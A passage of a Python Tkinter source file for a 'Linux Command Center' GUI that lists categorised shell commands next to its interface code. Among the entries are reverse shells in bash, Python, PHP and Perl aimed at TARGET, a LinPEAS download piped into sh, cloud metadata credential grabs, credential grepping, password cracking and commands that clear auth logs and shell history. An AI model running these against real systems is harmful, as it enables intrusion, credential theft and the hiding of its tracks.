            ("Stego LSB",                     "# python3 -c \"from PIL import Image; img=Image.open('image.png'); print([p&1 for p in list(img.convert('L').getdata())[:64]])\" 2>/dev/null"),
            ("zsteg",                         "# zsteg image.png"),
            ("PDF Crack",                     "# pdfcrack -f document.pdf -w /usr/share/wordlists/rockyou.txt"),
            ("ZIP Crack",                     "# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt file.zip"),
            ("Netcat File Send",              "# nc -lvnp 4444 > file  # receiver side"),
            ("Netcat File Recv",              "# nc TARGET 4444 < file  # sender side"),
            ("CyberChef Open",                "# xdg-open https://gchq.github.io/CyberChef/ 2>/dev/null || echo 'Open in browser: https://gchq.github.io/CyberChef/'"),
        ]
    },

    "🐋 Docker": {
        "color": "#0369a1",
        "commands": [
            ("Docker Version",                "docker version 2>/dev/null"),
            ("Docker Info",                   "docker info 2>/dev/null"),
            ("List Containers",               "docker ps -a"),
            ("List Images",                   "docker images"),
            ("Pull Image",                    "# docker pull IMAGE:TAG"),
            ("Run Container",                 "# docker run -it IMAGE /bin/bash"),
            ("Run with Ports",                "# docker run -d -p 8080:80 IMAGE"),
            ("Run with Volume",               "# docker run -v /host:/container IMAGE"),
            ("Stop Container",                "# docker stop CONTAINER_ID"),
            ("Remove Container",              "# docker rm CONTAINER_ID"),
            ("Remove Image",                  "# docker rmi IMAGE_ID"),
            ("Exec into Container",           "# docker exec -it CONTAINER_ID /bin/bash"),
            ("Docker Logs",                   "# docker logs CONTAINER_ID"),
            ("Docker Inspect",                "# docker inspect CONTAINER_ID"),
            ("Docker Networks",               "docker network ls 2>/dev/null"),
            ("Docker Volumes",                "docker volume ls 2>/dev/null"),
            ("Compose Up",                    "# docker-compose up -d"),
            ("Compose Down",                  "# docker-compose down"),
            ("Compose Logs",                  "# docker-compose logs -f"),
            ("Docker Stats",                  "docker stats --no-stream 2>/dev/null"),
            ("Prune Everything",              "# docker system prune -af"),
            ("Docker Socket Check",           "ls -la /var/run/docker.sock 2>/dev/null"),
            ("Build Image",                   "# docker build -t myimage:tag ."),
        ]
    },

    "☁️ Cloud & AWS": {
        "color": "#f97316",
        "commands": [
            ("AWS CLI Version",               "aws --version 2>/dev/null"),
            ("AWS Configure",                 "# aws configure"),
            ("AWS Current User",              "aws sts get-caller-identity 2>/dev/null"),
            ("AWS IAM List Users",            "# aws iam list-users"),
            ("AWS IAM List Roles",            "# aws iam list-roles"),
            ("AWS S3 List Buckets",           "# aws s3 ls"),
            ("AWS S3 List Contents",          "# aws s3 ls s3://BUCKET_NAME"),
            ("AWS S3 Download",               "# aws s3 cp s3://BUCKET_NAME/file ./"),
            ("AWS EC2 Instances",             "# aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress]' --output table"),
            ("AWS SSM Parameters",            "# aws ssm get-parameters-by-path --path '/' --recursive --with-decryption"),
            ("AWS Secrets Manager",           "# aws secretsmanager list-secrets"),
            ("IMDS Instance Metadata",        "curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null"),
            ("IMDS IAM Credentials",          "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null"),
            ("GCP gcloud Version",            "gcloud --version 2>/dev/null"),
            ("GCP Auth List",                 "gcloud auth list 2>/dev/null"),
            ("GCP List Projects",             "gcloud projects list 2>/dev/null"),
            ("Azure CLI Version",             "az --version 2>/dev/null"),
            ("Azure Account List",            "az account list 2>/dev/null"),
            ("Kubernetes Get Pods",           "kubectl get pods --all-namespaces 2>/dev/null"),
            ("Kubernetes Get Secrets",        "# kubectl get secrets --all-namespaces"),
            ("Terraform Version",             "terraform --version 2>/dev/null"),
            ("ScoutSuite Cloud Audit",        "# scout aws 2>/dev/null"),
        ]
    },

    "🗄️ Databases": {
        "color": "#7e22ce",
        "commands": [
            ("MySQL Login",                   "# mysql -u root -p"),
            ("MySQL Show DBs",                "# mysql -u root -p -e 'show databases;'"),
            ("MySQL Show Users",              "# mysql -u root -p -e 'select user,host from mysql.user;'"),
            ("MySQL Dump",                    "# mysqldump -u root -p DATABASE > backup.sql"),
            ("MySQL Import",                  "# mysql -u root -p DATABASE < backup.sql"),
            ("PostgreSQL Login",              "# sudo -u postgres psql"),
            ("PostgreSQL List DBs",           "# sudo -u postgres psql -c '\\l'"),
            ("PostgreSQL List Tables",        "# sudo -u postgres psql -c '\\dt' DATABASE"),
            ("Redis CLI",                     "# redis-cli"),
            ("Redis Auth Test",               "# redis-cli AUTH password"),
            ("Redis All Keys",                "# redis-cli KEYS '*'"),
            ("MongoDB Connect",               "# mongosh"),
            ("MongoDB Show DBs",              "# mongosh --eval 'show dbs'"),
            ("SQLite Open DB",                "# sqlite3 database.db"),
            ("SQLite Schema",                 "# sqlite3 database.db .schema"),
            ("Find MySQL Config",             "find / -name 'my.cnf' 2>/dev/null"),
            ("Find Postgres Config",          "find / -name 'postgresql.conf' 2>/dev/null"),
            ("DB Credentials Hunt",           "grep -r 'password\\|passwd\\|db_pass' /var/www/ 2>/dev/null | grep -v Binary | head -20"),
            ("Elasticsearch Query",           "# curl -X GET 'http://TARGET:9200/_cat/indices?v'"),
        ]
    },

    "⚡ Scripting": {
        "color": "#ca8a04",
        "commands": [
            ("Python3 Version",               "python3 --version"),
            ("Python3 HTTP Server",           "python3 -m http.server 8080"),
            ("Python3 PTY Shell",             "python3 -c \"import pty; pty.spawn('/bin/bash')\""),
            ("Bash Reverse Shell",            "# bash -i >& /dev/tcp/TARGET/4444 0>&1"),
            ("Python Reverse Shell",          "# python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"TARGET\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
            ("PHP Reverse Shell",             "# php -r '$s=fsockopen(\"TARGET\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
            ("Perl Reverse Shell",            "# perl -e 'use Socket;$i=\"TARGET\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"),
            ("Upgrade Shell (TTY)",           "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' ; export TERM=xterm"),
            ("Stty TTY Upgrade",              "# stty raw -echo; fg"),
            ("Curl Download",                 "# curl -O http://TARGET/file"),
            ("Wget Download",                 "# wget http://TARGET/file"),
            ("Curl POST JSON",                "# curl -X POST -H 'Content-Type: application/json' -d '{\"key\":\"val\"}' http://TARGET/api"),
            ("Generate Password",             "openssl rand -base64 24"),
            ("Generate UUID",                 "python3 -c 'import uuid; print(uuid.uuid4())'"),
            ("LinPEAS",                       "# curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"),
            ("Watch Command",                 "# watch -n 1 'ps aux | head -20'"),
            ("Parallel Jobs",                 "# echo {1..10} | xargs -n1 -P4 -I{} sh -c 'echo processing {}'"),
            ("Crontab Privesc Check",         "cat /etc/crontab; ls -la /etc/cron* 2>/dev/null"),
        ]
    },

    "🔧 Git & Dev": {
        "color": "#f97316",
        "commands": [
            ("Git Version",                   "git --version"),
            ("Git Init",                      "# git init"),
            ("Git Clone",                     "# git clone URL"),
            ("Git Status",                    "git status 2>/dev/null || echo 'Not a git repo'"),
            ("Git Log (pretty)",              "git log --oneline --graph --all 2>/dev/null | head -20"),
            ("Git Diff",                      "git diff 2>/dev/null"),
            ("Git Add All",                   "# git add -A"),
            ("Git Commit",                    "# git commit -m 'message'"),
            ("Git Push",                      "# git push origin main"),
            ("Git Pull",                      "# git pull"),
            ("Git Branches",                  "git branch -a 2>/dev/null"),
            ("Git Stash",                     "# git stash"),
            ("Git Reset Hard",                "# git reset --hard HEAD"),
            ("GitHub API Search",             "# curl 'https://api.github.com/search/repositories?q=QUERY'"),
            ("Gitdumper",                     "# python3 git-dumper.py http://TARGET/.git/ output/"),
            ("Trufflehog Secrets",            "# trufflehog git https://github.com/USER/REPO"),
            ("Gitleaks Scan",                 "# gitleaks detect --source ."),
            ("Git Find Secrets",              "git log --all --full-history -p 2>/dev/null | grep -E '(password|secret|token|key)' | head -20"),
        ]
    },

    "📋 Logs": {
        "color": "#475569",
        "commands": [
            ("Auth Log",                      "sudo tail -100 /var/log/auth.log 2>/dev/null"),
            ("Syslog",                        "sudo tail -100 /var/log/syslog 2>/dev/null"),
            ("Kernel Log",                    "sudo dmesg | tail -30"),
            ("Kernel Errors",                 "sudo dmesg --level=err,warn 2>/dev/null | tail -20"),
            ("Apache Access Log",             "sudo tail -50 /var/log/apache2/access.log 2>/dev/null"),
            ("Apache Error Log",              "sudo tail -50 /var/log/apache2/error.log 2>/dev/null"),
            ("Nginx Access Log",              "sudo tail -50 /var/log/nginx/access.log 2>/dev/null"),
            ("MySQL Error Log",               "sudo tail -50 /var/log/mysql/error.log 2>/dev/null"),
            ("journalctl Recent",             "journalctl -n 50 --no-pager 2>/dev/null"),
            ("journalctl Errors",             "journalctl -p err -n 50 --no-pager 2>/dev/null"),
            ("journalctl Service",            "# journalctl -u SERVICE_NAME -f"),
            ("journalctl Since",              "# journalctl --since '1 hour ago'"),
            ("All Log Files",                 "ls -laht /var/log/ 2>/dev/null"),
            ("Bash History",                  "cat ~/.bash_history 2>/dev/null | tail -30"),
            ("Zsh History",                   "cat ~/.zsh_history 2>/dev/null | tail -30"),
            ("Grep Error Logs",               "sudo grep -rn 'ERROR\\|CRITICAL\\|FATAL' /var/log/ 2>/dev/null | tail -20"),
            ("Clear Auth Log",                "# sudo truncate -s 0 /var/log/auth.log"),
            ("Clear Bash History",            "# history -c && history -w"),
        ]
    },

    "📊 Monitoring": {
        "color": "#0ea5e9",
        "commands": [
            ("Live CPU (top)",                "top -bn1 | head -20"),
            ("Htop",                          "htop 2>/dev/null || top"),
            ("Memory Detail",                 "cat /proc/meminfo | head -30"),
            ("IO Stats",                      "iostat -xz 1 3 2>/dev/null || vmstat 1 5"),
            ("Disk IO",                       "sudo iotop -b -n 1 2>/dev/null"),
            ("Per-Process IO",                "sudo pidstat -d 1 3 2>/dev/null"),
            ("CPU Frequency",                 "cat /sys/devices/system/cpu/cpu*/cpufreq/scaling_cur_freq 2>/dev/null | awk '{print $1/1000 \" MHz\"}'"),
            ("Load Average",                  "cat /proc/loadavg"),
            ("Interrupt Stats",               "cat /proc/interrupts | head -20"),
            ("Context Switches",              "vmstat 1 5 2>/dev/null"),
            ("Network Bytes",                 "cat /proc/net/dev | column -t"),
            ("TCP Retransmits",               "netstat -s 2>/dev/null | grep -i retransmit"),
            ("Swap Usage",                    "vmstat -s | grep -i swap"),
            ("SAR Stats",                     "sar 1 5 2>/dev/null"),
            ("Glances",                       "glances --one-line 2>/dev/null"),
            ("Watch Memory",                  "watch -n 1 'free -h'"),
            ("Watch Disk",                    "watch -n 5 'df -h'"),
            ("Watch Processes",               "watch -n 2 'ps aux --sort=-%cpu | head -15'"),
            ("Uptime & Load",                 "uptime && cat /proc/loadavg"),
            ("System Journal Boot",           "journalctl -b --no-pager 2>/dev/null | tail -30"),
        ]
    },
}

# ─────────────────────────────────────────────────────────────────
#  KEYBOARD SHORTCUTS
# ─────────────────────────────────────────────────────────────────
SHORTCUTS = {
    "Ctrl+L":      "Clear terminal output",
    "Ctrl+K":      "Kill / Stop running process",
    "Ctrl+S":      "Save output to file",
    "Ctrl+F":      "Focus search bar",
    "Ctrl+E":      "Focus command entry",
    "Ctrl+H":      "Show keyboard shortcuts",
    "Ctrl+ + / -": "Increase / decrease font size",
    "F5":          "Refresh current category",
    "Enter":       "Run command",
    "↑ / ↓":       "Navigate command history",
    "Tab":         "Autocomplete path",
}

# ─────────────────────────────────────────────────────────────────
#  QUICK ACTIONS
# ─────────────────────────────────────────────────────────────────
QUICK_ACTIONS = [
    ("📊  System Dashboard",
     "echo '── CPU ──' && top -bn1 | head -5 && echo && echo '── MEMORY ──' && free -h && echo && echo '── DISK ──' && df -h && echo && echo '── NETWORK ──' && ip a | grep 'inet ' && echo && echo '── TOP PROCS ──' && ps aux --sort=-%cpu | head -10"),
    ("🌡️   Live CPU/Mem",
     "top -bn1 | head -25"),
    ("🌐  Public IP Info",
     "curl -s https://ipinfo.io && echo"),
    ("🔐  Sudo Permissions",
     "sudo -l 2>/dev/null"),
    ("🛡️   Quick Security Audit",
     "echo '──SUID──' && find / -perm -4000 -type f 2>/dev/null | head -10 && echo '──WORLD-WRITABLE──' && find / -perm -0002 -type f 2>/dev/null | head -10 && echo '──SUDO──' && sudo -l 2>/dev/null | head -10"),
    ("📡  Network Overview",
     "echo '── Interfaces ──' && ip a | grep -E 'inet |state' && echo && echo '── Open Ports ──' && ss -tlnp"),
    ("🧹  Clean /tmp",
     "sudo find /tmp -mtime +1 -delete 2>/dev/null; echo 'Cleaned /tmp'"),
    ("📋  Recent Auth Events",
     "sudo tail -30 /var/log/auth.log 2>/dev/null || sudo journalctl -u sshd -n 30 --no-pager 2>/dev/null"),
]


# ─────────────────────────────────────────────────────────────────
#  MAIN APPLICATION
# ─────────────────────────────────────────────────────────────────
class LinuxCommandCenter(tk.Tk):

    def __init__(self):
        super().__init__()
        self.title("Linux Command Center — v3.0 PRO  |  by Demiyan Dissanayake")
        self.configure(bg=THEME["bg"])

        self.current_category = None
        self.running_process  = None
        self.search_var       = tk.StringVar()
        self.search_var.trace("w", self._filter_commands)
        self.command_buttons  = []
        self.history          = []
        self.history_index    = -1
        self.font_size        = 11

        try:
            self.state("zoomed")
        except Exception:
            self.geometry("1440x900")

        # TTK scrollbar style
        style = ttk.Style(self)
        style.theme_use("clam")
        style.configure("Vertical.TScrollbar",
                        background="#1e3a5f",
                        troughcolor=THEME["bg2"],
                        bordercolor=THEME["bg2"],
                        arrowcolor=THEME["accent"],
                        relief="flat")
        style.map("Vertical.TScrollbar",
                  background=[("active", "#2a5080")])

        self._build_fonts()
        self._build_ui()
        self._bind_shortcuts()
        self._show_category(list(COMMANDS.keys())[0])
        self._start_status_thread()

    # ─────────────────────────────────────────────────────────
    def _build_fonts(self):
        self.f_title    = font.Font(family="Courier New", size=16, weight="bold")
        self.f_cat      = font.Font(family="Courier New", size=10, weight="bold")
        self.f_cmd      = font.Font(family="Courier New", size=9)
        self.f_terminal = font.Font(family="Courier New", size=self.font_size)
        self.f_small    = font.Font(family="Courier New", size=8)
        self.f_entry    = font.Font(family="Courier New", size=11)
        self.f_badge    = font.Font(family="Courier New", size=8, weight="bold")

    def _bind_shortcuts(self):
        self.bind("<Control-l>",     lambda e: self._clear_output())
        self.bind("<Control-k>",     lambda e: self._stop_process())
        self.bind("<Control-s>",     lambda e: self._save_output())
        self.bind("<Control-f>",     lambda e: self.search_entry.focus_set())
        self.bind("<Control-e>",     lambda e: self.cmd_entry.focus_set())
        self.bind("<Control-h>",     lambda e: self._show_shortcuts())
        self.bind("<F5>",            lambda e: self._refresh_category())
        self.bind("<Control-plus>",  lambda e: self._font_size(1))
        self.bind("<Control-equal>", lambda e: self._font_size(1))
        self.bind("<Control-minus>", lambda e: self._font_size(-1))

    def _font_size(self, delta):
        self.font_size = max(8, min(18, self.font_size + delta))
        self.f_terminal.configure(size=self.font_size)

    def _refresh_category(self):
        if self.current_category:
            self._show_category(self.current_category)

    def _show_shortcuts(self):
        win = tk.Toplevel(self)
        win.title("⌨  Keyboard Shortcuts")
        win.configure(bg=THEME["bg2"])
        win.geometry("460x370")
        win.resizable(False, False)
        win.grab_set()

        tk.Label(win, text="⌨  KEYBOARD SHORTCUTS",
                 font=font.Font(family="Courier New", size=11, weight="bold"),
                 bg=THEME["bg2"], fg=THEME["accent"]).pack(pady=(16, 8))

        for key, desc in SHORTCUTS.items():
            row = tk.Frame(win, bg=THEME["bg3"])
            row.pack(fill="x", padx=18, pady=2)
            tk.Label(row, text=f"  {key:<16}",
                     font=self.f_badge, bg=THEME["bg3"],
                     fg=THEME["warning"], width=18, anchor="w").pack(side="left")
            tk.Label(row, text=desc,
                     font=self.f_small, bg=THEME["bg3"],
                     fg=THEME["text"], anchor="w").pack(side="left", padx=6)

        tk.Button(win, text="  Close  ", font=self.f_badge,
                  bg=THEME["hover"], fg=THEME["text_dim"],
                  relief="flat", padx=12, pady=5,
                  cursor="hand2",
                  command=win.destroy).pack(pady=14)

    # ─────────────────────────────────────────────────────────
    def _build_ui(self):
        # ── TOP BAR ──────────────────────────────────────────
        top = tk.Frame(self, bg=THEME["bg2"], height=56)
        top.pack(fill="x", side="top")
        top.pack_propagate(False)

        tk.Label(top, text="⚡",
                 font=font.Font(size=22), bg=THEME["bg2"],
                 fg=THEME["accent"]).pack(side="left", padx=(16, 4), pady=8)
        tk.Label(top, text="LINUX COMMAND CENTER",
                 font=font.Font(family="Courier New", size=15, weight="bold"),
                 bg=THEME["bg2"], fg=THEME["text_bright"]).pack(side="left", pady=8)
        tk.Label(top, text="  v3.0 PRO  |  by Demiyan Dissanayake",
                 font=font.Font(family="Courier New", size=9),
                 bg=THEME["bg2"], fg=THEME["accent"]).pack(side="left", pady=8)

        # Right controls
        ctrl = tk.Frame(top, bg=THEME["bg2"])
        ctrl.pack(side="right", padx=12)

        tk.Button(ctrl, text="A+", font=self.f_badge, bg=THEME["hover"],
                  fg=THEME["text_dim"], relief="flat", padx=6, pady=3,
                  cursor="hand2", command=lambda: self._font_size(1)).pack(side="right", padx=2)
        tk.Button(ctrl, text="A-", font=self.f_badge, bg=THEME["hover"],
                  fg=THEME["text_dim"], relief="flat", padx=6, pady=3,
                  cursor="hand2", command=lambda: self._font_size(-1)).pack(side="right", padx=2)
        tk.Button(ctrl, text="⌨ KEYS", font=self.f_badge, bg=THEME["hover"],
                  fg=THEME["text_dim"], relief="flat", padx=8, pady=3,
                  cursor="hand2", command=self._show_shortcuts).pack(side="right", padx=6)

        self.status_var = tk.StringVar(value="● Ready")
        tk.Label(top, textvariable=self.status_var,
                 font=self.f_badge, bg=THEME["bg2"],
                 fg=THEME["accent3"]).pack(side="right", padx=4)

        self.sysinfo_var = tk.StringVar(value="")
        tk.Label(top, textvariable=self.sysinfo_var,
                 font=self.f_small, bg=THEME["bg2"],
                 fg=THEME["text_dim"]).pack(side="right", padx=8)

        # ── MAIN BODY ─────────────────────────────────────────
        body = tk.Frame(self, bg=THEME["bg"])
        body.pack(fill="both", expand=True)

        # ── LEFT SIDEBAR — fully scrollable ──────────────────
        sidebar_outer = tk.Frame(body, bg=THEME["bg2"], width=234)
        sidebar_outer.pack(fill="y", side="left")
        sidebar_outer.pack_propagate(False)

        # Fixed header
        tk.Label(sidebar_outer, text="CATEGORIES",
                 font=self.f_badge, bg=THEME["bg2"],
                 fg=THEME["text_dim"]).pack(pady=(14, 4), padx=12, anchor="w")

        # Canvas + scrollbar
        sb_canvas = tk.Canvas(sidebar_outer, bg=THEME["bg2"],
                              highlightthickness=0, bd=0)
        sb_scroll = ttk.Scrollbar(sidebar_outer, orient="vertical",
                                  command=sb_canvas.yview)
        self.sb_inner = tk.Frame(sb_canvas, bg=THEME["bg2"])

        self.sb_inner.bind(
            "<Configure>",
            lambda e: sb_canvas.configure(scrollregion=sb_canvas.bbox("all"))
        )
        sb_canvas.create_window((0, 0), window=self.sb_inner, anchor="nw")
        sb_canvas.configure(yscrollcommand=sb_scroll.set)
        sb_canvas.pack(side="left", fill="both", expand=True)
        sb_scroll.pack(side="right", fill="y")

        # Bind scroll on canvas + inner frame
        def _sb_mw(e):
            sb_canvas.yview_scroll(-1 * (e.delta // 120 or (1 if e.num == 4 else -1)), "units")
        sb_canvas.bind("<MouseWheel>", _sb_mw)
        sb_canvas.bind("<Button-4>",  _sb_mw)
        sb_canvas.bind("<Button-5>",  _sb_mw)
        self.sb_inner.bind("<MouseWheel>", _sb_mw)
        self.sb_inner.bind("<Button-4>",  _sb_mw)
        self.sb_inner.bind("<Button-5>",  _sb_mw)

        # Category buttons
        self.cat_buttons = {}
        for cat_name in COMMANDS:
            cat = COMMANDS[cat_name]
            btn = tk.Button(
                self.sb_inner,
                text=f" {cat_name}",
                font=self.f_cat,
                bg=THEME["bg2"], fg=THEME["text_dim"],
                activebackground=THEME["hover"],
                activeforeground=cat["color"],
                relief="flat", anchor="w",
                cursor="hand2", padx=12, pady=7, width=24,
                command=lambda n=cat_name: self._show_category(n)
            )
            btn.pack(fill="x")
            self.cat_buttons[cat_name] = btn

            # Propagate scroll from buttons too
            btn.bind("<MouseWheel>", _sb_mw)
            btn.bind("<Button-4>",  _sb_mw)
            btn.bind("<Button-5>",  _sb_mw)

            def _enter(e, b=btn, c=cat["color"]):
                if b.cget("bg") != THEME["selected"]:
                    b.config(bg=THEME["hover"], fg=c)
            def _leave(e, b=btn):
                if b.cget("bg") != THEME["selected"]:
                    b.config(bg=THEME["bg2"], fg=THEME["text_dim"])
            btn.bind("<Enter>", _enter)
            btn.bind("<Leave>", _leave)

        # Quick Actions (scrollable, inside sb_inner)
        tk.Frame(self.sb_inner, bg=THEME["border"], height=1).pack(fill="x", padx=8, pady=8)
        tk.Label(self.sb_inner, text="QUICK ACTIONS",
                 font=self.f_badge, bg=THEME["bg2"],
                 fg=THEME["text_dim"]).pack(pady=(4, 6), padx=12, anchor="w")

        for qa_label, qa_cmd in QUICK_ACTIONS:
            qbtn = tk.Button(
                self.sb_inner, text=qa_label,
                font=self.f_small, bg=THEME["bg2"],
                fg=THEME["text_dim"],
                activebackground=THEME["hover"],
                activeforeground=THEME["accent"],
                relief="flat", anchor="w",
                cursor="hand2", padx=12, pady=5, width=24,
                command=lambda c=qa_cmd: self._run_command(c)
            )
            qbtn.pack(fill="x")
            qbtn.bind("<MouseWheel>", _sb_mw)
            qbtn.bind("<Button-4>",  _sb_mw)
            qbtn.bind("<Button-5>",  _sb_mw)

        # Footer
        tk.Frame(self.sb_inner, bg=THEME["border"], height=1).pack(fill="x", padx=8, pady=8)
        tk.Label(self.sb_inner, text="v3.0 PRO | Python + Tkinter",
                 font=self.f_small, bg=THEME["bg2"],
                 fg=THEME["text_dim"]).pack(pady=2)
        tk.Label(self.sb_inner, text="© Demiyan Dissanayake",
                 font=self.f_small, bg=THEME["bg2"],
                 fg=THEME["accent4"]).pack(pady=(0, 12))

        # ── MIDDLE (command list) ──────────────────────────────
        mid = tk.Frame(body, bg=THEME["bg3"], width=355)
        mid.pack(fill="y", side="left")
        mid.pack_propagate(False)

        # Search
        sf = tk.Frame(mid, bg=THEME["bg3"])
        sf.pack(fill="x", padx=10, pady=10)
        tk.Label(sf, text="🔎", bg=THEME["bg3"],
                 fg=THEME["text_dim"],
                 font=font.Font(size=11)).pack(side="left")
        self.search_entry = tk.Entry(sf, textvariable=self.search_var,
                                     font=self.f_entry,
                                     bg=THEME["panel"], fg=THEME["text"],
                                     insertbackground=THEME["accent"],
                                     relief="flat", bd=0)
        self.search_entry.pack(side="left", fill="x", expand=True, padx=6, ipady=5)
        tk.Button(sf, text="✕", font=self.f_badge, bg=THEME["panel"],
                  fg=THEME["text_dim"], relief="flat", cursor="hand2",
                  command=lambda: self.search_var.set("")).pack(side="right", padx=2)

        self.cat_title_var = tk.StringVar(value="")
        tk.Label(mid, textvariable=self.cat_title_var,
                 font=font.Font(family="Courier New", size=10, weight="bold"),
                 bg=THEME["bg3"], fg=THEME["accent"]).pack(anchor="w", padx=14, pady=(0, 2))

        self.cmd_count_var = tk.StringVar(value="")
        tk.Label(mid, textvariable=self.cmd_count_var,
                 font=self.f_small, bg=THEME["bg3"],
                 fg=THEME["text_dim"]).pack(anchor="w", padx=14, pady=(0, 4))

        # Command list (scrollable)
        cmd_canvas = tk.Canvas(mid, bg=THEME["bg3"], highlightthickness=0)
        cmd_sb = ttk.Scrollbar(mid, orient="vertical", command=cmd_canvas.yview)
        self.cmd_inner = tk.Frame(cmd_canvas, bg=THEME["bg3"])
        self.cmd_inner.bind("<Configure>",
            lambda e: cmd_canvas.configure(scrollregion=cmd_canvas.bbox("all")))
        cmd_canvas.create_window((0, 0), window=self.cmd_inner, anchor="nw")
        cmd_canvas.configure(yscrollcommand=cmd_sb.set)
        cmd_canvas.pack(side="left", fill="both", expand=True)
        cmd_sb.pack(side="right", fill="y")
        self._cmd_canvas = cmd_canvas

        def _cmd_mw(e):
            cmd_canvas.yview_scroll(-1 * (e.delta // 120 or (1 if e.num == 4 else -1)), "units")
        cmd_canvas.bind("<MouseWheel>", _cmd_mw)
        cmd_canvas.bind("<Button-4>",  _cmd_mw)
        cmd_canvas.bind("<Button-5>",  _cmd_mw)
        self.cmd_inner.bind("<MouseWheel>", _cmd_mw)
        self.cmd_inner.bind("<Button-4>",  _cmd_mw)
        self.cmd_inner.bind("<Button-5>",  _cmd_mw)
        self._cmd_mw = _cmd_mw

        # ── RIGHT (terminal) ──────────────────────────────────
        right = tk.Frame(body, bg=THEME["bg"])
        right.pack(fill="both", expand=True, side="left")

        # Terminal header
        term_hdr = tk.Frame(right, bg=THEME["panel"], height=44)
        term_hdr.pack(fill="x")
        term_hdr.pack_propagate(False)

        dot_f = tk.Frame(term_hdr, bg=THEME["panel"])
        dot_f.pack(side="left", padx=14, pady=12)
        for col in ["#ef4444", "#fbbf24", "#22c55e"]:
            tk.Frame(dot_f, width=12, height=12, bg=col).pack(side="left", padx=3)

        tk.Label(term_hdr, text="TERMINAL OUTPUT",
                 font=self.f_badge, bg=THEME["panel"],
                 fg=THEME["text_dim"]).pack(side="left", padx=8)

        btn_f = tk.Frame(term_hdr, bg=THEME["panel"])
        btn_f.pack(side="right", padx=14)

        for txt, bg, fg, fn in [
            ("■ STOP",   "#ef4444",      "#ffffff",          self._stop_process),
            ("⌫ CLEAR",  THEME["hover"], THEME["text_dim"],  self._clear_output),
            ("💾 SAVE",   THEME["hover"], THEME["text_dim"],  self._save_output),
            ("📋 COPY",   THEME["hover"], THEME["text_dim"],  self._copy_output),
        ]:
            tk.Button(btn_f, text=txt, font=self.f_badge,
                      bg=bg, fg=fg, relief="flat", padx=8, pady=3,
                      cursor="hand2", command=fn).pack(side="right", padx=3)

        # Terminal output
        self.terminal = scrolledtext.ScrolledText(
            right,
            font=self.f_terminal,
            bg=THEME["terminal_bg"], fg=THEME["terminal_fg"],
            insertbackground=THEME["accent3"],
            relief="flat", bd=0, state="disabled",
            wrap="word", padx=16, pady=16,
            selectbackground=THEME["selected"],
        )
        self.terminal.pack(fill="both", expand=True)

        self.terminal.tag_config("header",  foreground=THEME["accent"],
                                  font=font.Font(family="Courier New", size=11, weight="bold"))
        self.terminal.tag_config("cmd",     foreground=THEME["warning"],
                                  font=font.Font(family="Courier New", size=10))
        self.terminal.tag_config("output",  foreground=THEME["terminal_fg"])
        self.terminal.tag_config("error",   foreground=THEME["danger"])
        self.terminal.tag_config("success", foreground=THEME["success"])
        self.terminal.tag_config("info",    foreground=THEME["accent"])
        self.terminal.tag_config("dim",     foreground=THEME["text_dim"])

        # Bottom input bar
        bottom = tk.Frame(right, bg=THEME["bg2"], height=50)
        bottom.pack(fill="x")
        bottom.pack_propagate(False)

        tk.Label(bottom, text="❯",
                 font=font.Font(family="Courier New", size=14, weight="bold"),
                 bg=THEME["bg2"], fg=THEME["accent3"]).pack(side="left", padx=(14, 4))

        self.cmd_entry = tk.Entry(bottom, font=self.f_entry,
                                  bg=THEME["bg2"], fg=THEME["text_bright"],
                                  insertbackground=THEME["accent3"],
                                  relief="flat", bd=0)
        self.cmd_entry.pack(side="left", fill="x", expand=True, ipady=10, padx=4)
        self.cmd_entry.bind("<Return>", self._run_custom_command)
        self.cmd_entry.bind("<Up>",     self._history_up)
        self.cmd_entry.bind("<Down>",   self._history_down)
        self.cmd_entry.bind("<Tab>",    self._tab_complete)

        tk.Button(bottom, text="▶  RUN",
                  font=font.Font(family="Courier New", size=10, weight="bold"),
                  bg=THEME["accent3"], fg=THEME["bg"],
                  relief="flat", padx=16, pady=6, cursor="hand2",
                  command=self._run_custom_command).pack(side="right", padx=(4, 14))

        # Status bar
        statusbar = tk.Frame(self, bg=THEME["panel"], height=24)
        statusbar.pack(fill="x", side="bottom")
        statusbar.pack_propagate(False)

        total = sum(len(v["commands"]) for v in COMMANDS.values())
        tk.Label(statusbar,
                 text=f"  {platform.node()}  |  {platform.system()} {platform.release()}",
                 font=self.f_small, bg=THEME["panel"],
                 fg=THEME["text_dim"]).pack(side="left", padx=8)

        tk.Label(statusbar,
                 text=f"  {len(COMMANDS)} categories  •  {total} commands  •  Ctrl+H = shortcuts  ",
                 font=self.f_small, bg=THEME["panel"],
                 fg=THEME["text_dim"]).pack(side="right", padx=8)

        self._print_welcome()

    # ─────────────────────────────────────────────────────────
    def _print_welcome(self):
        total = sum(len(v["commands"]) for v in COMMANDS.values())
        self._write("\n", "output")
        for line in [
            "  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗       ██████╗ ██████╗\n",
            "  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝      ██╔════╝██╔════╝\n",
            "  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝       ██║     ██║\n",
            "  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗       ██║     ██║\n",
            "  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗      ╚██████╗╚██████╗\n",
            "  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝       ╚═════╝ ╚═════╝\n",
        ]:
            self._write(line, "header")
        self._write("\n", "output")
        self._write("  COMMAND CENTER v3.0 PRO  ——  All-in-One Linux Terminal Suite\n", "info")
        self._write(f"  Developer  : Demiyan Dissanayake\n", "success")
        self._write(f"  Platform   : {platform.system()} {platform.release()}\n", "dim")
        self._write(f"  Python     : {platform.python_version()}\n", "dim")
